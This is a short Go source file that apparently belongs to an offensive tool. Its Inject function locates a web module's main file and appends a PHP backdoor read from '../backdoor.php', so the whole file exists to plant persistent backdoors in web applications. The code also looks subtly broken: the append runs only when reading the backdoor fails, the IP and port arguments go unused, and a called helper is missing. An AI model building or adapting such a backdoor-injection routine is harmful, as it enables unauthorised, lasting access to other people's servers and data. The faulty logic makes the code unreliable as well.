package internals

import (
	"strings"

	"utils"
)

func findModuleName(path string) string {
	var pathSplitted []string = strings.Split(path, "/")
	return pathSplitted[len(pathSplitted) - 1]
}

func Inject(ip string, port uint16, path string) error {
	var moduleName string = findModuleName(path)
	var mainFile string = findMainFileDirectory(moduleName)

	return injectBackDoor(mainFile, "../backdoor.php")
}

func injectBackDoor(filePath string, backdoorPath string) error {
	var backdoor string
	var err error

	backdoor, err = utils.ReadFile(backdoorPath)
	if err != nil {
		err = utils.AppendToFile(backdoor, filePath)
	}

	return err
}